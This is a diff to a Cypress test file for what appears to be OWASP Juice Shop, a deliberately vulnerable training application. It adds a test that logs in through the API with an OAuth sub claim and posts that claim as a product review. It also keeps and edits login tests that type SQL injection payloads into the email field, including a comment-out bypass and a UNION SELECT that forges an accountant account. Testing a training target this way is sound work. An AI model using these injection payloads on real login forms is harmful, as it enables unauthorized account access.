@@ -143,6 +143,78 @@ describe('/#/login', () => {
     })
   })
 
+  describe('challenge "expose your own OAuth sub claim"', () => {
+    // real oauth login not possible as google username and pw would be exposed here. Therefore, executed by calling apis
+    it('should login with oauth and solve challenge when submitting sub claim as product review', () => {
+      const dateString = new Date().toISOString().replace(/[-:.T]/g, '')
+      const testUser = {
+        email: `testuser${dateString}@example.com`,
+        password: `TestPassword123!${dateString}`,
+        subclaim: `subclaim${dateString}`,
+        username: `TestUser${dateString}`
+      }
+
+      cy.window().then(async () => {
+        await fetch(
+          `${Cypress.config('baseUrl')}/api/Users`,
+          {
+            method: 'POST',
+            cache: 'no-cache',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              email: testUser.email,
+              password: testUser.password,
+              username: testUser.username
+            })
+          }
+        )
+      })
+
+      let token: string
+      cy.window().then(async () => {
+        const loginResponse = await fetch(
+          `${Cypress.config('baseUrl')}/rest/user/login`,
+          {
+            method: 'POST',
+            cache: 'no-cache',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              email: testUser.email,
+              password: testUser.password,
+              oauth: true,
+              subclaim: testUser.subclaim
+            })
+          }
+        )
+        const auth = await loginResponse.json()
+        token = auth.authentication.token
+      })
+
+      cy.window().then(async () => {
+        await fetch(
+          `${Cypress.config('baseUrl')}/rest/products/1/reviews`,
+          {
+            method: 'PUT',
+            cache: 'no-cache',
+            headers: {
+              'Content-Type': 'application/json',
+              Authorization: `Bearer ${token}`
+            },
+            body: JSON.stringify({
+              author: testUser.username,
+              message: testUser.subclaim
+            })
+          }
+        )
+      })
+      cy.expectChallengeSolved({ challenge: 'Exposed OAuth Access Token' })
+    })
+  })
+
   describe('challenge "ghostLogin"', () => {
     it('should be able to log in as chris.pike@juice-sh.op by using "\' or deletedAt IS NOT NULL --"', () => {
       cy.get('#email').type("' or deletedAt IS NOT NULL--")
@@ -165,7 +237,7 @@ describe('/#/login', () => {
   describe('challenge "ephemeralAccountant"', () => {
     it('should log in non-existing accountant user with SQLI attack on email field using UNION SELECT payload', () => {
       cy.get('#email').type(
-        "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--"
+        "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt', '' as subclaim)--"
       )
       cy.get('#password').type('a')
       cy.get('#loginButton').click()
